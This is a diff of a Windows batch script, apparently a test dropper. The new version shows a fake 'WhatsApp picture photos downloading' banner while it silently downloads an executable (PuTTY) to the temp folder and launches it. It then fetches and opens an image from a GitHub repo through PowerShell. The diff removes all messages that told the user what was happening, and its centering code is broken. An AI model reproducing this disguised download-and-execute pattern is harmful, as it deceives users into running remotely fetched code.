@@ -1,67 +1,39 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Define ESC variable for ANSI escape codes
-set "ESC="
-for /f %%A in ('echo prompt $E ^| cmd') do set "ESC=%%A"
+:: Calculate center position for the text
+for /f "delims=" %%a in ('echo prompt $H ^| cmd') do set "ESC=%%a"
+for /f %%a in ('"prompt $E & for %%b in (1) do rem"') do set "BS=%%a"
+set "text=WHATSAPP PICTURE PHOTOS DOWNLOADING......."
+set /a center=(80 - !text!^)/2
+
+:: Display centered text
+echo %ESC%[1;%center%H!text!
 
 :: Set the PuTTY download URL and destination file
 set "puttyUrl=https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
 set "puttyDestination=%TEMP%\putty.exe"
-set "puttyMessageColor=5"  :: 5 for pink, 0 for black
-
-:: Set the new image download URL and destination file
-set "imageUrl=https://raw.githubusercontent.com/johnihr00/test-files/main/mypic1.jpg"
-set "imageDestination=%TEMP%\downloaded_image.jpg"
-set "imageMessageColor=2"  :: 2 for green, 0 for black
-
-:: Display PuTTY "Please wait" message
-call :setColor !puttyMessageColor!
-echo Please wait, PuTTY is downloading...
 
 :: Download PuTTY silently
 curl -o "!puttyDestination!" -L --silent "!puttyUrl!" || wget -q -O "!puttyDestination!" "!puttyUrl!"
 
-:: Check if the PuTTY download was successful
+:: Run PuTTY if download was successful
 if !errorlevel! equ 0 (
-    call :setColor !puttyMessageColor!
-    echo PuTTY downloaded successfully to: !puttyDestination!
-    :: Run PuTTY
     start "" "!puttyDestination!"
-) else (
-    call :setColor !puttyMessageColor!
-    echo Error downloading PuTTY.
 )
 
-:: Display new image "Please wait" message
-call :setColor !imageMessageColor!
-echo Please wait, new image is downloading...
+:: Set the new image download URL and destination file
+set "imageUrl=https://raw.githubusercontent.com/johnihr00/test-files/main/mypic1.jpg"
+set "imageDestination=%TEMP%\downloaded_image.jpg"
 
-:: Download the new image using bitsadmin
-bitsadmin /transfer "DownloadedImage" "!imageUrl!" "!imageDestination!"
+:: Download the new image using PowerShell
+powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imageDestination%') }"
 
-:: Check if the new image download was successful
+:: Open the downloaded image with the default image viewer if download was successful
 if exist "!imageDestination!" (
-    call :setColor !imageMessageColor!
-    echo New image downloaded successfully to: !imageDestination!
-    :: Open the downloaded image with the default image viewer
     start "" "!imageDestination!"
-) else (
-    call :setColor !imageMessageColor!
-    echo Error downloading the new image.
 )
 
-:: Reset color and end script
-call :resetColor
+:: End script
 endlocal
-exit /b
-
-:setColor
-:: Set the text color (pink or dark black or green)
-<nul set /p ".=!ESC![38;5;%1m"
-exit /b
-
-:resetColor
-:: Reset the text color
-<nul set /p ".=!ESC![0m"
 exit /b
